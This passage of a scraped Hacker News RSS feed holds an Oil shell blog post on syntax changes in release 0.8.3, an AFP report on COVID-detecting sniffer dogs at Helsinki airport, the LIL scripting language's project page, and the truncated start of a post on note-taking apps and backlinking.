<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-31
</p>
<p>I recently released <a href="https://www.oilshell.org/release/0.8.3/">Oil 0.8.3</a>, and it's the biggest release in
recent memory!  What's new?</p>
<ul>
<li>Many changes to the <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil expression language</a>, including
Python compatibility and legacy syntax removal.</li>
<li>Changes to the <strong>word</strong> syntax, e.g. the <code>@</code> sigil.</li>
<li>Keyword changes, like the removal of <code>pass</code>.</li>
<li>New <strong>functions</strong>, like <code>_match()</code> to access <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">eggex</a> matches.</li>
<li>Enhancements to <a href="http://www.oilshell.org/cross-ref.html?tag=shell-builtin#shell-builtin">shell builtins</a>, including <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>
support in <code>read</code> and <code>write</code>.</li>
<li>The comprehensive <code>errexit</code> overhaul, <a href="http://www.oilshell.org/blog/2020/10/osh-features.html#reliable-error-handling">mentioned in the last
post</a>.</li>
<li>Many new docs</li>
</ul>
<p>This is the first of two posts that describe the language changes.  Separately,
I plan to write "the ultimate guide" to error handling in shell.</p>
<p>If you're not familiar with Oil, see the <strong>new</strong> <a href="http://www.oilshell.org/release/latest/doc/language-influences.html">Language
Influences</a> and  <a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language
Idioms</a> docs, as well as posts tagged
#<a href="http://www.oilshell.org/blog/tags.html?tag=oil-language#oil-language">oil-language</a>.</p>
 
<a name="help-wanted"></a>
<h2>Help Wanted</h2>
<p>If you're interested in Oil, now is a great time to get involved.  Recall that
the <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">last post</a> said that OSH would have four significant
fixes, but the rest of the project was too much work.  <strong>The work described
here is what I need help with</strong>!</p>
<p>Toward the end, I recently updated these pages:</p>
<ul>
<li><a href="https://github.com/oilshell/oil#important-we-accept-small-contributions">We Accept Small Contributions</a></li>
<li><a href="https://github.com/oilshell/oil/wiki/Contributing">Contributing</a></li>
</ul>
<p>Asking questions and leaving feedback about the language on
<a href="http://www.oilshell.org/cross-ref.html?tag=zulip#zulip">Zulip</a> is also appreciated!  Several people have influenced the
language design this way.</p>
<a name="operators-expression-mode"></a>
<h2>Operators (Expression Mode)</h2>
<p>The expression language lets you talk about typed data with operators and
literals.  Let's review those changes first.</p>
<a name="return-to-python-compatibility"></a>
<h3>Return to Python Compatibility</h3>
<p>Last year, Oil had some "cleanups" of the Python expression language, but I
decided that the unfamiliarity isn't worth it.  I reverted them, so:</p>
<ul>
<li>Integer division <code>div</code> is back to <code>//</code></li>
<li>Modulus <code>mod</code> is back to <code>%</code></li>
<li><code>xor</code> is back to <code>^</code></li>
<li>Exponentiation <code>^</code> is back to <code>**</code></li>
</ul>
<p>(The <a href="#appendix">appendix</a> has some rationale for this.)</p>
<a name="to-concatenate-and-to-match-globs"></a>
<h3><code>++</code> to concatenate, <code>~~</code> and <code>!~~</code> to match globs</h3>
<p>The <code>++</code> operator is for string and list concatenation.  That is, <code>a + b</code>
always does <strong>math</strong>, and <code>a ++ b</code> always does concatenation.</p>
<p>This is to support Awk-like auto-type conversion.  Similarly, comparison
operators like <code>&lt;</code> and <code>&lt;=</code> will only work on numbers, and we'll use a
different syntax for strings.  (Yes, I realize the danger with such type
conversion!)</p>
<p>The <code>~~</code> and <code>!~~</code> operators are for glob matching.  They deprecate <code>[[ x == *.py ]]</code> in <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.</p>
<a name="literals-expression-mode"></a>
<h2>Literals (Expression Mode)</h2>
<a name="dicts-are-not"></a>
<h3>Dicts are <code>{}</code>, not <code>%{}</code></h3>
<p>This is another return to Python compatibility.</p>
<p>We used sigils like <code>%{foo: 42}</code> in dict literals because Oil uses <code>{ }</code> for
C-like statement  blocks, and it lacks semicolons.</p>
<p>Making the tokens distinct is one way to avoid a subtle parsing issue.  <a href="https://news.ycombinator.com/item?id=22706645">This
Hacker News comment</a> about the
Dart language describes some of the difficulties with using <code>{}</code>  in both
expressions and statements.</p>
<p>However, Oil's problem  is not as hard as Dart's, and I solved it by simply
including newlines in the grammar.  A key-value pair can be on a line:</p>
<pre><code>var mydict = {
  server: "www.example.com"  
  port: 80
}
</code></pre>
<p>But you can't split it across lines</p>
<pre><code>
var mydict = {
  server:
    "www.example.com"
}
</code></pre>
<p>without either <code>()</code> or <code>\</code>:</p>
<pre><code>var mydict = {
  
  server: (
    "www.example.com"
  )
}
</code></pre>
<p>It was bugging me that lists are just <code>[1, 2, 3]</code>, while dicts were <code>%{key: 'value'}</code>.  This is now fixed!</p>
<p>(<a href="https://oilshell.zulipchat.com/#narrow/stream/121540-oil-discuss/topic/Expression.20Language.20Improvements/near/212235586">Good Zulip Feedback on Line
Breaking</a>.
I'm still looking for more feedback.)</p>
<hr>
<p>I also removed the <code>%[]</code> syntax , which was an overly ambitious idea for typed
array literals.  We already have <code>%(one two)</code> for shell-like arrays, and
<code>['one', 'two']</code> for Python/JS-like lists.</p>
<p>(Aside: Perl and Ruby have <code>qw(one two)</code> or <code>qw[one two]</code> which is like our
<code>%(one two)</code>.)</p>
<a name="blocks-are-echo-pwd"></a>
<h3>Blocks are <code>&amp;(echo $PWD)</code></h3>
<p>Oil's Ruby-like blocks are "first class".  Normally they're passed to procs as
the last argument:</p>
<pre><code>cd /tmp {
  echo $PWD
}
</code></pre>
<p>But we also need them in <a href="http://www.oilshell.org/release/latest/doc/command-vs-expression-mode.html">expression
mode</a>.
I decided on the syntax <span><code>&amp;(echo $PWD)</code></span>.</p>
<p>This may seem inconsistent at first, but it's consistent with command subs:</p>
<pre><code>var b1 = $(echo $PWD)  
var b2 = &amp;(echo $PWD)  
</code></pre>
<a name="chars-are-u012345"></a>
<h3>Chars are <code>\u{012345}</code></h3>
<p>Character literals <strong>stand alone</strong> in the expression language, like</p>
<pre><code>var x = \u{3bf}  
</code></pre>
<p>That is, you don't need quotes.  They're for both "code point literals"
("runes" in Go) and <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">eggex</a> char classes.</p>
<p>This syntax is now consistent within C-escaped strings like <code>$''</code> and <code>c''</code>,
and <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>, which leads us into the next section.</p>
<a name="tightened-up-string-literals"></a>
<h2>Tightened Up String Literals</h2>
<p>Shell has a rich string literal syntax.  Oil inherits all of its power, but (as
of this release) removes unnecessary flexibility.</p>
<a name="c-style"></a>
<h3>C-Style</h3>
<p>Here are some C-style strings:</p>
<pre><code>echo $'C-style'
echo $'\n \i'               
echo $'\0123 \x01 \x1'      
echo $' \u1234 \U00012345'  
</code></pre>
<p>Notes:</p>
<ol>
<li><code>\n</code> is a valid char escape, but <code>\i</code> is an <strong>invalid</strong> one.  Bash accepts
it and prints <code>\i</code> literally.</li>
<li>Octal escapes and hex escapes can express exactly the same bytes.</li>
<li>Hex escapes can be abbreviated <code>\x1</code> instead of <code>\x01</code>.</li>
</ol>
<p>I made the following changes to simplify this syntax:</p>
<ol>
<li>Disallow invalid char escapes.</li>
<li>Disallow <strong>all</strong> octal escapes.</li>
<li>Disallow single char hex escapes.  Must be <code>\xHH</code>.</li>
<li>Disallow the two unicode escapes in favor of the QSN/Rust style <code>\u{12345}</code>,
which I added support for.</li>
</ol>
<p>As usual, <strong>we do a dance to avoid breaking existing code</strong>, while preventing
legacy from creeping into the <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a>:</p>
<ul>
<li>In command mode, <code>shopt --unset parse_backslash</code> enables all these syntax
errors.  This is the default in <code>bin/oil</code> (option group <code>oil:all</code>).</li>
<li>In expression mode, they're always disallowed, even when running <code>bin/osh</code>.
Legacy shell scripts don't have expressions, so this is OK!</li>
</ul>
<a name="a-superset-of-qsn"></a>
<h3>A Superset of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a></h3>
<p>Now that we have <code>\u{12345}</code>, we have an interesting property: any <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>
string is now an Oil string!  Though you have to add a <code>$</code> sigil:</p>
<pre><code>echo $'QSN and Oil \\ \n'    

var mystr = $'\x01 \u{3bf}'  
var mystr = c'\x01 \u{3bf}'  
</code></pre>
<a name="double-quoted"></a>
<h3>Double Quoted</h3>
<p>Here are some doubled quoted strings:</p>
<pre><code>echo "double quoted"
echo "\$ \i"         
echo "\\ \ ."        
echo "\$ $ ."        
echo "old: `hostname`, new: $(hostname)"  
</code></pre>
<p>Oil makes the following changes:</p>
<ul>
<li><code>parse_backslash</code> makes <code>\i</code> and <code>\</code> a syntax error.  Add the
<code>\</code> to fix it.</li>
<li><code>parse_dollar</code> makes <code>$</code> a syntax error.  Ditto.</li>
<li><code>parse_backticks</code> makes the old command sub style a syntax
error.  Use the new style.</li>
</ul>
<p>These options are <strong>unset</strong> in the <a href="http://www.oilshell.org/release/latest/doc/oil-options.html">option group</a>
<code>oil:all</code>.</p>
<p>Aside: our <a href="http://www.oilshell.org/blog/tags.html?tag=lexing#lexing">lexing style</a> is awesome for making these
changes!</p>
<a name="word-syntax-command-mode"></a>
<h2>Word Syntax (Command Mode)</h2>
<p>I made similar changes to <strong>unquoted words</strong>.</p>
<a name="parse_at_all-reserves-words-beginning-with"></a>
<h3><code>parse_at_all</code> Reserves Words Beginning With <code>@</code></h3>
<p>In the <code>oil:basic</code> option group, we allow this syntax, but we only break the
bare minimum:</p>
<pre><code>echo @myarray
</code></pre>
<p>But the <code>oil:all</code> option group reserves <strong>any</strong> word beginning with <code>@</code>, like:</p>
<pre><code>@{} @[] @// @'' @""
</code></pre>
<p>This will be useful for future language extensions.  That is, creating more
syntax errors lets the language <strong>evolve</strong>.</p>
<p>I also expect <code>shopt --unset parse_dollar</code> to have this benefit.  It allows us
to parse inline eggexes like <code>$/ digit+ /</code>.</p>
<a name="parse_dollar-again-for-strictness"></a>
<h3><code>parse_dollar</code> Again, For Strictness</h3>
<p>To recap:</p>
<p>No:</p>
<pre><code>echo $
echo "$"
</code></pre>
<p>Yes:</p>
<pre><code>echo \$
echo "\$"
</code></pre>
<p>TODO: We also need to support <code>strict_backslash</code> in unquoted words.</p>
<a name="next"></a>
<h2>Next</h2>
<p>This post got long, so I split it into two parts.  The next part will review
changes in Oil keywords, stdlib functions, shell builtins, and documentations.</p>
<p><a href="https://old.reddit.com/r/oilshell/comments/jle86e/big_changes_to_the_oil_language/?">Let me know</a> what you think of these changes!</p>

<a name="appendix-the-tea-language"></a>
<h2>Appendix: The Tea Language</h2>
<p>One reason to be more Python compatible is that I have a quixotic plan to
self-host Oil and expose the <a href="http://www.oilshell.org/cross-ref.html?tag=metalanguage#metalanguage">metalanguage</a> to users.  That is, our DSLs:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=opy#opy">OPy</a> / <a href="http://www.oilshell.org/cross-ref.html?tag=mypy#mypy">MyPy</a> subset</li>
<li>Zephyr <a href="http://www.oilshell.org/cross-ref.html?tag=zephyr-asdl#zephyr-asdl">ASDL</a></li>
<li>A dialect of <a href="http://www.oilshell.org/cross-ref.html?tag=regular-language#regular-language">regular languages</a></li>
</ul>
<p>should be combined into one language, which I'm calling "Tea".</p>
<p>Against my better judgement, I brought this up <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/jb5i5m/help_i_keep_stealing_features_from_elixir_because/g8urxou/">on
Reddit</a>
and <a href="https://lobste.rs/s/4hx42h/assorted_thoughts_on_zig_rust#c_mqpg6e">on
lobste.rs</a>.
Briefly, Tea can be described as <strong>statically-typed Python with sum types</strong>
‚Äî which someone asked actually for!</p>
<p>And it should have <a href="http://www.oilshell.org/cross-ref.html?tag=metaprogramming#metaprogramming">metaprogramming</a> features to express the equivalent
of Oil's use of textual code generation.</p>
<p>I wrote a working grammar to design Tea's syntax (*), but that's the only
implementation so far.  It would be a large project, but it's also a concrete
one, because we have 30K-60K+ lines of working code as a use case.</p>
<p>If you want to work on a statically typed language, let me know!  I don't know
how to write a type checker, and can use help.</p>
<p>Even if Tea doesn't get done, Oil will be useful either way.  We can continue
using these DSLs for a long time.</p>
<hr>
<p>(*) The entire language is expressed in the grammar as a big expression, using
a single <a href="http://www.oilshell.org/cross-ref.html?tag=lexer-modes#lexer-modes">lexer mode</a>.  It's nowhere near as complicated as
shell!</p>




</div>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/big-changes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949731</guid>
            <pubDate>Sat, 31 Oct 2020 07:37:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finland's Covid sniffer dog trial 'extremely positive': researchers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949592">thread link</a>) | @respinal
<br/>
October 30, 2020 | https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nav-container="">
                                        

                
                <div>
                                <nav>
    <ol>
                    <li>                                        <a href="https://www.rfi.fr/en/" aria-label="Back to homepage"><svg xmlns="http://www.w3.org/2000/svg" viewBox="9299 -3984 9.748 12"><path fill="currentColor" d="M-1805,3480h-3v-7.125l4.875-4.875,4.874,4.875V3480H-1801v-4h-4v4Z" transform="translate(11107 -7452)"></path></svg>
</a></li>
                    <li><span>/</span>                                        <a href="https://www.rfi.fr/en/live-news/">Live news</a></li>
            </ol>
</nav>
    
                
    <article>
        

                        

            

                            <p><span>Issued on: <time datetime="2020-10-28T16:38:05+00:00" pubdate="pubdate">28/10/2020 - 17:38</time></span></p>
                    

    
                                    <div>
                                                                                                                
<figure>
    <p><img src="https://s.rfi.fr/media/display/7006f538-193c-11eb-bfd9-005056a964fe/w:310/p:16x9/61e9874f1c836ef58147abd96c3dad75be8c1d7f.jpg" alt="Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall." data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/7006f538-193c-11eb-bfd9-005056a964fe\/&quot;,&quot;filename&quot;:&quot;61e9874f1c836ef58147abd96c3dad75be8c1d7f.jpg&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;16x9&quot;}">
    </p>
                        <figcaption>
                <span>Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall.</span>                <span>Lehtikuva/AFP</span>            </figcaption>
            </figure>
                                                            </div>
                    
                

    
            <div>
            
                            <p>Vantaa (Finland) (AFP)</p>
                        <p>A pilot project using sniffer dogs to provide instant and pain-free coronavirus testing at Helsinki airport has shown promising early results and proven popular with travellers, researchers said on Wednesday.</p><p>Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall, and have found the virus in 0.6 percent of travellers.</p><p>Although the research is not due for completion until December, the team say the initial findings appear broadly in line with detection rates of the nasal PCR tests also conducted on arriving travellers.</p><p>"We have done 16-17,000 PCR tests at the airport and less than one percent are positive," Timo Aronkyto, deputy mayor of Vantaa, told reporters.</p><p>Compared to the results found by the dogs, "they are about the same, I don't think there is a statistical difference," Aronkyto said.</p><p>The researchers are now analysing how closely the two sets of test results match each other -- whether the dogs found coronavirus in passengers whose infection was confirmed by a PCR test -- and hope to publicise their findings at the end of the year.</p><p>Preliminary experiments in the first major wave of infections earlier in the year suggested the dogs can detect the virus with close to 100 percent accuracy, up to five days earlier than a PCR test.</p><p>Feedback from arriving passengers, who take the free-of-charge test voluntarily, "has been exceptionally positive," project manager Soile Turunen said. </p><p>Around 100 travellers a day have been queuing up for the test, which involves wiping a swab onto the skin which is then put in front of the dog, who will quickly pass over a negative sample but will be attracted to a positive one.</p><p>"People don't complain about the queues, in fact it's the opposite," Turunen said. </p><p>"They're coming up to us to to say 'Hi' from morning until evening," she added.</p><p>A fourth dog, a German shepherd called Valo, is currently in training to begin work at the airport testing booth.</p><p>The Helsinki University researchers behind the trial, working with sniffer-dog specialists from the organisation Wise Nose, hope that their research will persuade the government to fund a rollout of the dogs for other uses, such as at tourist hotspots or large public gatherings.</p><p>Although sniffer dog trials have been undertaken elsewhere, such as in the UAE, France, Ruussia and Chile, use of canine scent-detectors to bolster coronavirus testing has not yet been widely adopted by authorities, in part because of a lack of peer-reviewed literature, some researchers believe.</p><p>Dog handling charities have previously worked with dogs to detect cancers, Parkinson's disease and bacterial infections using samples taken from humans.</p>
            <p>¬© 2020 AFP</p>        </div>

            
                </article>
            
        
                                            
                                    </div>
            </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949592</guid>
            <pubDate>Sat, 31 Oct 2020 06:47:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LIL: Little Interpreted Language]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949515">thread link</a>) | @marttt
<br/>
October 30, 2020 | http://runtimeterror.com/tech/lil/ | <a href="https://web.archive.org/web/*/http://runtimeterror.com/tech/lil/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p><b>LIL</b> (stands for <b>L</b>ittle <b>I</b>nterpreted <b>L</b>anguage)
is a small highly dynamic scripting language inspired by Tcl and
unix shells. LIL has two implementations, one written in <b>C</b>,
which consists of a pair of <tt>.c</tt> and <tt>.h</tt> files
and one in <b><a href="http://freepascal.org/">Free Pascal</a></b>,
which consists of a single <tt>pas</tt> file (a unit). Also a
<a href="http://lazarus-ide.org/">Lazarus</a> package for the
latter is provided.</p>

<h2>Contents</h2>

<menu>
  <li><a href="#downloads">Downloads</a>
  <menu>
    <li><a href="#latestversion">Latest version</a>
    </li><li><a href="#olderversions">Older versions</a>
    </li><li><a href="#winlil">WinLIL</a>
    </li><li><a href="#lilgui">LILGUI</a>
  </li></menu>
  </li><li><a href="#stability">API stability and compatibility</a>
  </li><li><a href="#documentation">Documentation</a>
  </li><li><a href="#status">Status</a>
  </li><li><a href="#license">License</a>
</li></menu>

<h2><a name="downloads"></a>Downloads</h2>

<p>LIL is currently available as source code snapshots of both
the C and the Free Pascal version combined in a single ZIP file.
These snapshots are versioned using their release date. Note that
the interpreter's reflect version command will report <i>0.1</i>
regardless of date versioning. Both of these will change at some
point in the future to provide proper versioned releases.</p>

<h3><a name="latestversion"></a>Latest version</h3>

<p>The latest version of LIL is <a href="http://runtimeterror.com/tech/lil/lil20190821.zip">lil20190821.zip</a>
(159KB). This is an extract from my private Fossil repository
(the files are mostly the same as the older archives, but this
also includes a full changelog from the repository going back
to 2010 and the LIL logo as an XCF image which can be opened with
GIMP).</p>

<p>Please note that <b>20190821</b> contains slightly altered
behavior for line breaking during list parsing that <i>could</i>
affect some scripts, especially with lists that contain code inside
square brackets, however the previous behavior was completely
broken (e.g. having multiple commands inside brackets in a list
would merge all commands into a single one and if a semicolon
was used for the multiple commands, the entire command wouldn't
be parsed properly). Because of that i expect any reliance on
the previous behavior to be accidental (and in practice i do not
really expect any such script to even exist). Also in the same
version a Bash script is introduced to check the differences between
different executables by running the same scripts under both and
comparing the results, which show that FPLIL contains a few incompatibilities
with C LIL. At this moment FPLIL doesn't implement the changes
mentioned so far - all these incompatibilities and changes will
be fixed in a later release.</p>

<h3><a name="olderversions"></a>Older versions</h3>

<p>Some older versions are also available in case you need them.
LIL should be mostly backwards compatible (see below), but right
now there is no promise for strict API or ABI compatibility.</p>

<ul>
  <li><a href="http://runtimeterror.com/tech/lil/lil20190819.zip">lil20190819.zip</a> (155KB)<a href="http://runtimeterror.com/tech/lil/lil20190818.zip"></a>
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20190818.zip">lil20190818.zip</a> (154KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20190114.zip">lil20190114.zip</a> (91KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20161129.zip">lil20161129.zip</a> (88KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20160812.zip">lil20160812.zip</a> (88KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20160603.zip">lil20160603.zip</a> (88KB)
</li></ul>

<h3><a name="winlil"></a>WinLIL</h3>

<p>If you are using Windows you can also download <b>WinLIL</b>,
a small Windows-based environment with editor, console and extra
graphics functions that can be used to experiment with LIL. It
is self-contained in a single executable, including the LIL documentation.</p>

<p>The latest version is <a href="http://runtimeterror.com/tech/lil/winlil14.zip">WinLIL 1.4</a>
(204KB) based on <i>C LIL 20190821</i>. <a href="http://runtimeterror.com/tech/lil/winlil.png">Here
is a screenshot</a> of it in action. Also a small doodle program
can be <a href="http://runtimeterror.com/tech/lil/doodle.lil">downloaded here</a> and a <a href="http://runtimeterror.com/tech/lil/doodle.gif">screenshot
seen here</a>. <a href="http://runtimeterror.com/tech/lil/winlil20190821231511.zip">This archive</a>
(45KB) contains the source code, but note that it uses the original
Borland C++ Builder and to compile with a newer version (such
as the free Community Edition) you'll need to recreate the project
file and make a few modifications to the code.</p>

<p>Older versions of WinLIL can be found in these files: <a href="http://runtimeterror.com/tech/lil/winlil13.zip">winlil13.zip</a>
(1.3 binary), <a href="http://runtimeterror.com/tech/lil/winlil20190524200539.zip">winlil20190524200539.zip</a>
(1.3 source), <a href="http://runtimeterror.com/tech/lil/winlil20170425.zip">winlil20170424.zip</a>
(binary), <a href="http://runtimeterror.com/tech/lil/winlilsrc20161220.7z">winlilsrc20161220.7z</a>
(source).</p>

<h3><a name="lilgui"></a>LILGUI</h3>

<p><b>LILGUI</b> is an experimental API specification for GUI
applications that provide scripting functionality through LIL
to expose a simple GUI API. It is mainly intended for creating
embeddable GUIs (e.g. a panel in a sidebar) although it can also
be used for popup windows and dialogs. Currently the only implementation
for LILGUI is <b>LazLILGUI</b>, which is a component for Lazarus
that uses LCL to provide the actual GUI functionality.</p>

<p>The latest version of LILGUI files (which include the API spec,
LazLILGUI and a couple of examples) can be <a href="http://runtimeterror.com/tech/lil/lilgui20190708215135.zip">downloaded
here</a> (85KB). A 64bit windows binary for <b>LazLILGUI Notepad</b>,
a text editor that provides a sidebar to try out LILGUI code,
can be <a href="http://runtimeterror.com/tech/lil/llgnotepad20190708.zip">downloaded here</a> (1.3MB).
Also you can see the screenshots of program in action under <a href="http://runtimeterror.com/tech/lil/llgnotepadwin.png">Windows</a>, <a href="http://runtimeterror.com/tech/lil/llgnotepadlin.png">Linux</a>
and <a href="http://runtimeterror.com/tech/lil/llgnotepadosx.png">Mac OS X</a> and also the <a href="http://runtimeterror.com/tech/lil/llgcce.png">Custom Control Example</a> under Windows.</p>

<h2><a name="stability"></a>API stability and compatibility</h2>

<p>Generally speaking, both the C and Free Pascal implementation
APIs are stable <i>for the most part</i>. The <b>C API</b> was
broken only once in middle 2010 when <code>lil_command_t</code>
was renamed to <code>lil_func_t</code> and the <b>C ABI</b> for
the Windows DLL is also backwards compatible since late 2010.
The <b>Free Pascal</b> implementation has a less stable API but
as Free Pascal itself does not support ABI stability, this is
less of a concern.</p>

<p>In the foreseeable future the C API should be stable, but i'd
recommend <i>against</i> building a system-wide shared version
of the library before a proper versioned release is made. Once
a versioned release is made, both the API and ABI will remain
stable for as long as it is technically possible.</p>

<p>Script code should be backwards compatible even as new commands
are introduced since scripts and host applications will redefine
any conflicting functions anyway. The only time script code was
broken was in 2012 when the multiline comments were introduced
so any script that used a comment line like <code>#####</code>
was broken. This was addressed in a fix in 2014 that added a special
check for such cases so that multiline comments can only start
and end with two <code>#</code>s but not three or more (while
this could have broken any script that used three or more <code>#</code>s
to start and end multiline comments, the chances for such a script
are very slim).</p>

<p>Like with the C API, the script backwards compatibility currently
is mostly stable, but minor changes (like the multiline comment
changes mentioned above) might be made until a versioned release
is made or fixes to the script behavior to be closer to what is
described in the documentation or simply fix broken behavior.
At that point no changes will be made that may affect backwards
compatibility.</p>

<p>LILGUI and LazLILGUI are more experimental and may see backwards
incompatible changes in the future.</p>

<h2><a name="documentation"></a>Documentation</h2>

<p>Currently the only documentation is the (lengthy) <tt>readme.txt</tt>
file that <a href="http://runtimeterror.com/tech/lil/readme.txt">you can read here</a> or as part
of the archive containing the source code. At some point i'll
write better formatted documentation. Free Pascal has its own
API documentation <a href="http://runtimeterror.com/tech/lil/pasreadme.txt">readable here</a> and
also as a part of the archive containing the source code.</p>

<p>The LILGUI API can be <a href="http://runtimeterror.com/tech/lil/api.txt">found here</a> and
the documentation for LazLILGUI can be <a href="http://runtimeterror.com/tech/lil/llgreadme.txt">found
here</a>. Both are also part of the LILGUI archive.</p>

<p>Also <a href="http://www.slideshare.net/badsectoracula/lil-presentation">an
old LIL presentation can be found on SlideShare</a>. Please note
that the URLs in the presentation are not valid anymore.</p>

<h2><a name="status"></a>Status</h2>

<p>LIL is practically <i>feature-complete</i> and i do very little
development of it. I do not plan on making it a big and bloated
library that tries to provide everything - if anything, in the
future i might add some conditionals to remove bits of the library
for users who do not need, e.g, the string or list functions.</p>

<p>Further work is mostly "around" LIL and not on the
language itself: improving the documentation, writing a test suite
(currently there are several examples which i run after making
changes and almost half of them come from bug fixes, but i'd like
somethnig more automated), fixing some issues with the Free Pascal
implementation, adding more functions on the C API to access LIL's
state, etc.</p>

<h2><a name="license"></a>License</h2>

<p>Both the C and Free Pascal implementations as well as WinLIL
are licensed under the zlib license below:</p>

<blockquote>
  <pre>LIL - Little Interpreted Language
Copyright (C) 2010-2019 Kostas Michalopoulos

This software is provided 'as-is', without any express or implied
warranty.  In no event will the authors be held liable for any damages
arising from the use of this software.

Permission is granted to anyone to use this software for any purpose,
including commercial applications, and to alter it and redistribute it
freely, subject to the following restrictions:

1. The origin of this software must not be misrepresented; you must not
   claim that you wrote the original software. If you use this software
   in a product, an acknowledgment in the product documentation would be
   appreciated but is not required.
2. Altered source versions must be plainly marked as such, and must not be
   misrepresented as being the original software.
3. This notice may not be removed or altered from any source distribution.</pre>
</blockquote>



</div>]]>
            </description>
            <link>http://runtimeterror.com/tech/lil/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949515</guid>
            <pubDate>Sat, 31 Oct 2020 06:20:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you need to know about windsocks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949514">thread link</a>) | @oftenwrong
<br/>
October 30, 2020 | https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/ | <a href="https://web.archive.org/web/*/https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949514</guid>
            <pubDate>Sat, 31 Oct 2020 06:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Note Taking Apps]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949421">thread link</a>) | @finder83
<br/>
October 30, 2020 | https://jself.net/posts/note-taking/ | <a href="https://web.archive.org/web/*/https://jself.net/posts/note-taking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>About every year or so I decide to change note-taking apps. Or at least I change <em>most</em> of my notes to a new app. This time I'm going back to an old app, but because of a "new" note-taking paradigm. The one I'm going back to is <a href="https://orgmode.org/">Org Mode</a>, but with a twist. In this post, I hope to look at some of the new ideas in note-taking and some of the apps available.</p><p>The new paradigm that I'm talking about is backlinking. It's actually not a new idea at all of course, but there have been many apps that have started to take advantage of backlinking. The one that launched off the fad was <a href="https://roamresearch.com/">Roam Research</a>. Many of these tools are based on or enable, a note-taking method called Zettelkasten.</p><p>Zettelkasten is a technique of note taking and indexing popularized by Niklas Luhmann, a German sociologist from the middle of the 20th century. Zettelkasten, literally "slip box", was a note-taking method in which small slips of paper were ID'd and linked to one another, creating a linked system of knowledge that Luhmann could then use in his books, research, and papers. As the links were maintained in two directions, ideas could be backward linked to other ideas. Ideas from various sources could then form a new network and hopefully, new links could be formed between information. There's more to it, such as the idea that each note should be an atomic, well-formed idea. For more information, and because I'm failing to explain it, visit <a href="https://zettelkasten.de/">https://zettelkasten.de/</a>.</p><p>I won't pretend to be an expert in Zettelkasten, and all of this is new to me. Frankly, I'm not even sure that the Zettelkasten method would be useful to me as I need longer form notes on many of the things that I do. But the idea of backlinking notes so that you can refer to notes that refer to the note that you're on seems extremely powerful. It feels like the next innovation in note-taking, beyond simple outlining or linking, precisely because you're essentially forming a distributed network of notes.</p><h2>Backlinks</h2><p>Let me give you an example. Say that I'm working on Kubernetes and can't remember the name of a tool that I had used. I can just pull up the Kubernetes note and look at the backlinks and see which notes are tagged as Kubernetes. Why couldn't I just create a link on the Kubernetes note? Well, of course, I could, but that would require opening that note and adding a link that may have nothing to do with the context for the primary Kubernetes notes.</p><p>Or another example, I am taking notes on a sermon being preached on John 3. I can then dive into John 3's note and look at all other sources tagged with John 3, including sermon notes, book notes, or 